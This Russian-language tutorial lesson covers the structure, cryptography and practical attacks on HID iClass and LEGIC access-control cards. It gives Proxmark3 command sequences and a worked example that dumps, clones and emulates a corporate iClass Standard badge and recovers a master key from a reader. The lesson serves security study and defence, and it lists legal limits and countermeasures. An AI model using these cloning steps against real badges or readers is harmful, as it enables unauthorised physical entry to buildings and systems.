Mifare — не единственный стандарт HF-карт 13.56 МГц. В корпоративном и транспортном секторах широко распространены **HID iClass** и **LEGIC**. Оба относятся к «proprietary» семействам с собственной криптографией и своим набором ошибок. Для атакующего они интересны тем, что стандартные ключи часто остаются заводскими, а часть ранних версий содержит уязвимости уровня Crypto1. Этот урок — про структуру, криптографию и практические атаки на iClass и LEGIC.

## Зачем этот урок

Базовый `hardware-hf-cards` покрывает Mifare Classic и Ultralight. Но в реальных СКУД корпораций очень часто стоят HID iClass (пропуска сотрудников) и LEGIC (транспорт, доступ). Их нельзя прочитать теми же инструментами «в один клик», потому что у них своя модуляция и своя криптография. Понимание различий между iClass Standard/Picopass/SE и LEGIC prime/advant/... важно и для защиты: путать эти семейства — значит неправильно оценивать риск. Кроме того, iClass — классический пример того, как «защищённая» карта ломается через ключ, зашитый во всех ридерах одного вендора.

## HID iClass: аппаратная база

iClass — HF-карта 13.56 МГц от HID Global (часть ASSA ABLOY), с модуляцией, отличной от ISO 14443-A/B. Она существует в вариантах:

- **iClass Standard** (2k/16k/32k) — основной формат;
- **iClass SE** — Secure Identity, поддерживает SIO (Secure Identity Object) и diversified keys;
- **iClass Seos** — современный формат, часто на базе Java Card;
- **iClass Elite** — с диверсификацией ключей на уровне клиента;
- **Picopass** — ребрендинг iClass для некоторых рынков, часто с стандартными ключами.

Физически iClass использует proprietary-протокол: не ISO 14443, а собственный, с CRC, ECC и challenge-response. Поэтому «просто прочитать» iClass телефоном с NFC нельзя — нужен Proxmark3 или специализированный ридер.

## iClass: аутентификация и ключи

iClass Standard хранит данные, зашифрованные через **3DES** (или DES) с ключом, производным от master key. Ключи диверсифицируются по CSN (Card Serial Number) через алгоритм, зашитый в прошивке ридера HID. Слабость: **стандартный transport/master key** широко известен и присутствует в открытых прошивках ридеров (и в проекте `iclass` для Proxmark3).

Модель аутентификации iClass Standard:

1. Ридер отправляет challenge.
2. Карта отвечает MAC (3DES/DES).
3. Ридер проверяет, используя диверсифицированный ключ.

Если ключ стандартный, любой, у кого есть Proxmark3 с ключами, читает карту. Именно так iClass Standard был скомпрометирован: исследователи извлекли ключи из ридеров, и теперь существуют публичные базы ключей.

**iClass SE / Seos** используют diversified keys и SIO, поэтому старый трюк с общим ключом не работает — требуется ключ конкретной системы.

## Взлом iClass

Инструменты и подходы:

- **Proxmark3** (`hf iclass` команды) — чтение, dump, эмуляция;
- **iCopy-X** — специализированный клонер iClass;
- **Flipper Zero** — ограниченная поддержка iClass (чтение/эмуляция);
- **PM3 iclass keyrecovery** — восстановление ключа по эмуляции карты (ридер должен «представиться»).

Базовый поток в Proxmark3:

```bash
# Определить карту (поиск в поле)
pm3 --> hf search
# ожидаем: Valid iClass tag / Picopass found, CSN: XX XX XX XX XX XX XX XX

# Прочитать карту с известными ключами (ключи в iclass.lua/keys)
pm3 --> hf iclass reader
# или dump в файл
pm3 --> hf iclass dump --ki 0

# Восстановление ключа через эмуляцию (если ридер использует неизвестный ключ)
pm3 --> hf iclass sim -t 3
# читаем лок-дамп, затем
pm3 --> hf iclass keyrecovery --csn <CSN>
```

Ключевые команды Proxmark3 для iClass: `hf iclass search`, `reader`, `dump`, `rdbl` (read block), `wrbl` (write block), `sim` (simulate), `eload`, `esave`, `loclass` (восстановление ключа из лок-дампа ридера), `calcnewkey`, `chk`.

`hf iclass loclass` — это восстановление master key из дампа, снятого с ридера (нужен физический доступ к ридеру для снятия «loclass» дампа). Публичный набор ключей делает iClass Standard почти тривиальным.

## LEGIC: семейство

**LEGIC** — швейцарская технология HF-карт, популярная в Европе (транспорт, доступ, микроплатежи). Семейства:

- **LEGIC prime** — раннее, с proprietary-криптографией, сломано (исследования 2000-х, LEGIC prime cryptanalysis);
- **LEGIC advant** — AES-128, современнее;
- **LEGIC c2000/4000/6000** — чипы разных поколений;
- **LEGIC ORCA** — транспортный стандарт (например, Нидерланды), на базе advant.

LEGIC prime использует proprietary-алгоритм, который был существенно ослаблен исследованиями: атакующий мог восстановить секреты при доступе к ридеру или карте. advant использует AES и значительно устойчивее.

## LEGIC: атаки

- **prime**: извлечение секретов из памяти карты/ридера, восстановление ключей (нужны специализированные инструменты и/или доступ к оборудованию);
- **advant**: атаки требуют доступа к ключам системы; стандартных ключей меньше;
- **эмуляция**: Proxmark3 и специальные прошивки для LEGIC ограничены; часто нужен оригинальный ридер.

На практике LEGIC-аудит начинается с идентификации поколения карты, потому что от этого зависит вся стратегия.

## Инструменты и команды

```bash
# Proxmark3 — iClass
hf iclass search
hf iclass reader
hf iclass dump --ki 0
hf iclass rdbl -b 7 --ki 0
hf iclass wrbl -b 7 -d 0000000000000000 --ki 0
hf iclass sim -t 3
hf iclass keyrecovery --csn 0123456789ABCDEF
hf iclass loclass -f loclass_dump.bin
hf iclass calcnewkey --ki 0 --key <hex>

# Proxmark3 — LEGIC (ограниченно)
hf legic reader
hf legic info
hf legic dump
# Для prime часто нужен отдельный ридер/клонер

# iCopy-X (автономный)
# читает/клонирует iClass, Mifare, EM и др. по меню
# icopy-x -r        # read
# icopy-x -w        # write

# Flipper Zero (ограниченно)
# NFC -> Read -> iClass (может показать CSN/частично)
```

Полезные флаги: `--ki <n>` — индекс ключа; `-b <block>` — блок; `-d <hex>` — данные; `-t <type>` — тип симуляции; `-f <file>` — файл дампа; `--csn` — серийник карты.

## Разобранный пример: чтение и клонирование iClass Standard

**Дано:** корпоративный пропуск HID iClass Standard. Цель — прочитать и клонировать.

**Шаг 1 — идентификация.**

```bash
pm3 --> hf search
[+] Valid iClass tag / Picopass found
[+] CSN: 8A 3F 21 11 22 33 44 55
[+] Config: ...
```

**Шаг 2 — чтение с публичными ключами.**

```bash
pm3 --> hf iclass dump --ki 0
[+] Reading blocks with key index 0...
[+] Saved 256 bytes to iclass_dump.bin
```

Если ключ стандартный, дамп снят за секунды.

**Шаг 3 — запись на чистую карту.** Клонируем на совместимый тег:

```bash
pm3 --> hf iclass restore -f iclass_dump.bin
[+] Writing blocks...
[+] Done
```

**Шаг 4 — эмуляция (если ридер не в поле).**

```bash
pm3 --> hf iclass eload -f iclass_dump.bin
pm3 --> hf iclass sim -t 3
```

**Шаг 5 — если ключ нестандартный.** Снимаем loclass-дамп с ридера (нужен доступ), затем `hf iclass loclass -f loclass_dump.bin` восстанавливает master key; после этого читаем карту.

## Edge cases и защита

- **SE / Seos / Elite.** Стандартный ключ не работает — нужны diversified keys конкретной системы.
- **Модуляция.** iClass — не ISO 14443; NFC-телефон его не прочитает.
- **Picopass.** Часто использует стандартные ключи, но не всегда.
- **LEGIC prime vs advant.** Стратегия полностью зависит от поколения.
- **Правовые рамки.** Чтение и клонирование чужих пропусков — преступление. Работайте со своими картами/стендом.
- **Защита:** iClass SE/Seos с SIO, LEGIC advant (AES), диверсификация ключей на уровне клиента, ротация ключей, мониторинг аномалий доступа, многофакторность (карта + PIN/биометрия).

## Частые ошибки

- Пытаться прочитать iClass телефоном с NFC — не тот протокол.
- Считать iClass Standard защищённым: публичные ключи делают его почти открытым.
- Путать iClass Standard и SE: у SE другой уровень защиты.
- Использовать Mifare-инструменты для LEGIC.
- Забывать про «card only» vs «card + PIN» в СКУД: клон карты не всегда даёт доступ.
- Игнорировать law: клонирование корпоративных пропусков — тяжёлое нарушение.

## Что дальше / решение

- **Proxmark3 + iclass.lua** для практики на своих картах.
- **Изучение SE/Seos** — следующая ступень (SIO, diversified keys).
- **Связка с СКУД-аудитом**: ридеры, протоколы (Wiegand), реле.
- **Защита:** миграция с iClass Standard/Picopass на SE/Seos, LEGIC advant; включение second factor.
